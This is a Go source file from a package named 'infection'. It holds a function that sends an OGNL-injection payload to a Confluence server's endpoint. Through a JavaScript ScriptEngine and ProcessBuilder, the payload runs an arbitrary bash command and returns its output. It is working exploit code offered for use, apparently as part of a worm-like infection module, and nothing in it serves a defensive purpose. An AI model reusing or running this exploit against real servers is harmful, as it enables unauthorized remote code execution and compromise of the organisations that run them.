package infection

import (
	"io/ioutil"
	"log"
  "bytes"
	"net/http"
  "encoding/json"
)

func ConfluenceCmdExecute(url string, endpoint string) string {

  var cmd string

  exploitUrl := url + endpoint
  /* This is used in the python script
  postHeader, _ := json.Marshal(map[string]string{
    "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Connection": "close",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept-Encoding": "gzip, deflate",
  })
  */
  postData, _ := json.Marshal(map[string]string {
    "queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var cmd = new java.lang.String(\\u0022" + cmd + "\\u0022);var p = new java.lang.ProcessBuilder(); p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027",
  })

  responseBody := bytes.NewBuffer(postData)

  httpResponse, err := http.Post(exploitUrl, "application/json", responseBody)

  if err != nil {
    log.Fatal("An Error Occured %v", err)
  }

  defer httpResponse.Body.Close()

  body, err := ioutil.ReadAll(httpResponse.Body)
  if err != nil {
    log.Fatal(err)
  }
  sb := string(body)

  log.Println(sb)

  return "ConfluenceCmdExecute Finished"
  }
